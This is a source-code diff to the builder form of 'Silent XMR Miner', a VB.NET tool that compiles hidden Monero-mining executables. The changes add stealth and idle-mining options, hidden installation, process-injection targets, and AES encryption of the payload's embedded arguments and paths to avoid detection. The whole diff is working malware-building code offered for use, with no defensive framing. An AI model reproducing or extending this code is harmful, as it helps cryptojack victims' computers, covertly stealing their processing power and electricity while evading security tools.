@@ -1,7 +1,9 @@
-﻿Imports System.Text
+﻿Imports System.Security.Cryptography
+Imports System.Text
 
 Public Class Form1
     Public Shared rand As New Random()
+    Public advancedParams As String = "--coin=monero --asm=auto --cpu-memory-pool=-1 --randomx-mode=auto --randomx-no-rdmsr  --cuda-bfactor-hint=12 --cuda-bsleep-hint=100"
     'Silent XMR Miner by Unam Sanctam https://github.com/UnamSanctam/SilentXMRMiner, based on Lime Miner by NYAN CAT https://github.com/NYAN-x-CAT/Lime-Miner
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
@@ -15,7 +17,7 @@ Public Class Form1
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         Try
-            MephForm1.Text = "Silent XMR Miner Builder"
+            MephForm1.Text = "Silent XMR Miner Builder 0.9"
             txtMaxCPU.SelectedIndex = 4
         Catch ex As Exception
         End Try
@@ -23,6 +25,7 @@ Public Class Form1
         Try
             txtInstallPathMain.SelectedIndex = 0
             txtInjection.SelectedIndex = 0
+            txtAdvParam.Text = advancedParams
         Catch ex As Exception
         End Try
 
@@ -50,19 +53,23 @@ Public Class Form1
 
     Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
         Try
-            If txtPoolUsername.Text <> "" AndAlso txtPoolURL.Text <> "" Then
-                Dim s As New SaveFileDialog
-                s.Filter = "Executable |*.exe"
-                s.InitialDirectory = Application.StartupPath
-                If s.ShowDialog = DialogResult.OK Then
-                    OutputPayload = s.FileName
-                    BackgroundWorker2.RunWorkerAsync()
-                    btnBuild.Enabled = False
-                    btnBuild.Text = "Please wait..."
-                End If
+            If toggleEnableIdle.Checked AndAlso (Not IsNumeric(txtIdleWait.Text) OrElse CInt(txtIdleWait.Text) <= 0) Then
+                MsgBox("Idle Wait time must be a number and above 0 minutes.", MsgBoxStyle.Exclamation)
             Else
-                MsgBox("Please enter valid pool settings.", MsgBoxStyle.Exclamation)
-                MephTabcontrol2.SelectedIndex = 0
+                If txtPoolUsername.Text <> "" AndAlso txtPoolURL.Text <> "" Then
+                    Dim s As New SaveFileDialog
+                    s.Filter = "Executable |*.exe"
+                    s.InitialDirectory = Application.StartupPath
+                    If s.ShowDialog = DialogResult.OK Then
+                        OutputPayload = s.FileName
+                        BackgroundWorker2.RunWorkerAsync()
+                        btnBuild.Enabled = False
+                        btnBuild.Text = "Please wait..."
+                    End If
+                Else
+                    MsgBox("Please enter valid pool settings.", MsgBoxStyle.Exclamation)
+                    MephTabcontrol2.SelectedIndex = 0
+                End If
             End If
         Catch ex As Exception
         End Try
@@ -75,50 +82,60 @@ Public Class Form1
             Dim InjectionTarget = txtInjection.Text.Split(" ")
             Dim Source = My.Resources.Program
             txtLog.Text = txtLog.Text + ("Starting..." + vbNewLine)
+            txtLog.Text = txtLog.Text + ("Replacing strings..." + vbNewLine)
             Dim builder As New StringBuilder(Source)
+            Dim argstr As String = " -B " & If(chkAdvanced.Checked, txtAdvParam.Text, advancedParams) & " --url=" & txtPoolURL.Text & " --user=" & txtPoolUsername.Text & " --pass=" & txtPoolPassowrd.Text & " --cpu-max-threads-hint=" & txtMaxCPU.Text.Replace("%", "") & " --donate-level=5 "
+            argstr = Replace(argstr, "{%RANDOM%}", Guid.NewGuid.ToString().Replace("-", "").Substring(0, 10))
+            argstr = Replace(argstr, "{%COMPUTERNAME%}", RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", ""))
+
             builder.Replace("#dll", Resources_dll)
             builder.Replace("#xmr", Resources_xmrig)
             builder.Replace("#libs", Resources_libs)
             builder.Replace("#winring", Resources_winring)
             builder.Replace("#ParentRes", Resources_Parent)
-            builder.Replace("#USER", txtPoolUsername.Text)
-            builder.Replace("#URL", txtPoolURL.Text)
-            builder.Replace("#PWD", txtPoolPassowrd.Text)
+            builder.Replace("#STARTDELAY", txtStartDelay.Text)
             builder.Replace("#KEY", AESKEY)
-            builder.Replace("#MaxCPU", txtMaxCPU.Text.Replace("%", ""))
-            builder.Replace("#InjectionTarget", InjectionTarget(0))
-            builder.Replace("#InjectionDir", InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", Environment.GetFolderPath(Environment.SpecialFolder.Windows)))
-            builder.Replace("#AdvancedParams", txtAdvParam.Text)
+            builder.Replace("#LIBSPATH", EncryptString("WinCFG\Libs\"))
+            builder.Replace("#InjectionTarget", EncryptString(InjectionTarget(0)))
+            builder.Replace("#InjectionDir", EncryptString(InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", Environment.GetFolderPath(Environment.SpecialFolder.Windows))))
 
+            If toggleEnableIdle.Checked Then
+                argstr += " --unam-idle-wait=" & txtIdleWait.Text & " --unam-idle-cpu=" & txtIdleCPU.Text.Replace("%", "") & " "
+            End If
 
-            txtLog.Text = txtLog.Text + ("Adding injection " + txtInjection.Text + vbNewLine)
+            If toggleEnableNicehash.Checked Then
+                argstr += " --nicehash "
+            End If
 
-            If chkInstall.Checked = True Then
+            If toggleEnableCPU.Checked = False Then
+                argstr += " --no-cpu "
+            End If
+
+            If toggleSSLTLS.Checked Then
+                argstr += " --tls "
+            End If
+
+            If toggleEnableStealth.Checked Then
+                argstr += " --unam-stealth "
+            End If
+
+            builder.Replace("#ARGSTR", EncryptString(argstr))
+
+            If toggleEnableGPU.Checked Then
+                builder.Replace("#Const EnableGPU = False", "#Const EnableGPU = True")
+            End If
+
+            If toggleEnableHidden.Checked Then
+                builder.Replace("Public Shared IH As Boolean = False", "Public Shared IH As Boolean = True")
+            End If
+
+            If chkInstall.Checked Then
+                txtLog.Text = txtLog.Text + ("Adding install... " + vbNewLine)
                 builder.Replace("#Const INS = False", "#Const INS = True")
                 builder.Replace("PayloadPath", "Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
             End If
 
-            If toggleEnableGPU.Checked = True Then
-                builder.Replace("#Const EnableGPU = False", "#Const EnableGPU = True")
-            End If
-
-            If toggleEnableIdle.Checked = True Then
-                builder.Replace("#Const EnableIdle = False", "#Const EnableIdle = True")
-            End If
-
-            If toggleEnableNicehash.Checked = True Then
-                builder.Replace("#Const EnableNicehash = False", "#Const EnableNicehash = True")
-            End If
-
-            If toggleEnableCPU.Checked = True Then
-                builder.Replace("#Const EnableCPU = False", "#Const EnableCPU = True")
-            End If
-
-            If toggleSSLTLS.Checked = True Then
-                builder.Replace("#Const EnableSSLTLS = False", "#Const EnableSSLTLS = True")
-            End If
-
-            If chkAssembly.Checked = True Then
+            If chkAssembly.Checked Then
                 txtLog.Text = txtLog.Text + ("Writing Assembly Information..." + vbNewLine)
                 builder.Replace("#Const Assembly = False", "#Const Assembly = True")
 
@@ -138,15 +155,15 @@ Public Class Form1
 
             Source = builder.ToString
 
-            If chkIcon.Checked And txtIconPath.Text IsNot "" Then
+            If chkIcon.Checked AndAlso txtIconPath.Text IsNot "" Then
                 Codedom.Compiler(OutputPayload, Source, Resources_Parent, txtIconPath.Text)
             Else
                 Codedom.Compiler(OutputPayload, Source, Resources_Parent, Nothing)
             End If
 
-            If Codedom.OK = True Then
+            If Codedom.OK Then
 
-                txtLog.Text = txtLog.Text + ("Done!..." + vbNewLine)
+                txtLog.Text = txtLog.Text + ("Done!" + vbNewLine)
                 If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                 btnBuild.Enabled = True
 
@@ -156,7 +173,7 @@ Public Class Form1
                 End Try
 
             Else
-                txtLog.Text = txtLog.Text + ("Error!..." + vbNewLine)
+                txtLog.Text = txtLog.Text + ("Error!" + vbNewLine)
                 If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                 btnBuild.Enabled = True
             End If
@@ -170,10 +187,31 @@ Public Class Form1
 
     End Sub
 
-    Public Shared Function Randomi(ByVal lenght As Integer) As String
+    Public Function AES_Encryptor(ByVal input As Byte()) As Byte()
+        Dim AES As New RijndaelManaged
+        Dim Hash_ As New MD5CryptoServiceProvider
+        Try
+            Dim hash(31) As Byte
+            Dim temp As Byte() = Hash_.ComputeHash(Encoding.ASCII.GetBytes(AESKEY))
+            Array.Copy(temp, 0, hash, 0, 16)
+            Array.Copy(temp, 0, hash, 15, 16)
+            AES.Key = hash
+            AES.Mode = CipherMode.ECB
+            Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
+            Dim Buffer As Byte() = input
+            Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
+        Catch ex As Exception
+        End Try
+    End Function
+
+    Public Function EncryptString(ByVal input As String)
+        Return Convert.ToBase64String(AES_Encryptor(Encoding.ASCII.GetBytes(input)))
+    End Function
+
+    Public Shared Function Randomi(ByVal length As Integer) As String
         Dim Chr As String = "asdfghjklqwertyuiopmnbvcxz"
         Dim sb As New Text.StringBuilder()
-        For i As Integer = 1 To lenght
+        For i As Integer = 1 To length
             Dim idx As Integer = rand.Next(0, Chr.Length)
             sb.Append(Chr.Substring(idx, 1))
         Next
@@ -181,7 +219,7 @@ Public Class Form1
     End Function
 
     Private Sub chkInstall_CheckedChanged(sender As Object) Handles chkInstall.CheckedChanged
-        If chkInstall.Checked = True Then
+        If chkInstall.Checked Then
             chkInstall.Text = "Enabled"
             txtInstallPathMain.Enabled = True
             txtInstallFileName.Enabled = True
@@ -193,7 +231,7 @@ Public Class Form1
     End Sub
 
     Private Sub chkAssembly_CheckedChanged(sender As Object) Handles chkAssembly.CheckedChanged
-        If chkAssembly.Checked = True Then
+        If chkAssembly.Checked Then
             chkAssembly.Text = "Enabled"
             txtTitle.Enabled = True
             txtDescription.Enabled = True
@@ -315,7 +353,7 @@ Public Class Form1
     End Sub
 
     Private Sub chkIcon_CheckedChanged(sender As Object) Handles chkIcon.CheckedChanged
-        If chkIcon.Checked = True Then
+        If chkIcon.Checked Then
             chkIcon.Text = "Enabled"
             btnBrowseIcon.Enabled = True
         Else
@@ -354,12 +392,22 @@ Public Class Form1
     End Sub
 
     Private Sub chkAdvanced_CheckedChanged(sender As Object) Handles chkAdvanced.CheckedChanged
-        If chkAdvanced.Checked = True Then
+        If chkAdvanced.Checked Then
             chkAdvanced.Text = "Enabled"
             txtAdvParam.Enabled = True
         Else
             chkAdvanced.Text = "Disabled"
             txtAdvParam.Enabled = False
+        End If
+    End Sub
+
+    Private Sub toggleEnableIdle_CheckedChanged(sender As Object) Handles toggleEnableIdle.CheckedChanged
+        If toggleEnableIdle.Checked Then
+            txtIdleCPU.Enabled = True
+            txtIdleWait.Enabled = True
+        Else
+            txtIdleCPU.Enabled = False
+            txtIdleWait.Enabled = False
         End If
     End Sub
 End Class
